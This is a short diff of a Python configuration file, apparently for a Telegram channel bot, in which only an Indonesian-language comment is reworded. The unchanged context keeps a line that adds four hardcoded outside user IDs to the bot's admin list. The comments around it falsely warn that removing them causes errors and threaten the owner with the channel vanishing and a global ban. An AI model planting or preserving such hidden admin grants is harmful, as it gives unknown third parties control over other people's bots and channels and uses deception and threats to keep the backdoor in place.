@@ -60,7 +60,7 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True
 
 ADMINS.append(OWNER_ID)
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
-# Spoiler KONSEKUENSI Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
 ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))
 
 
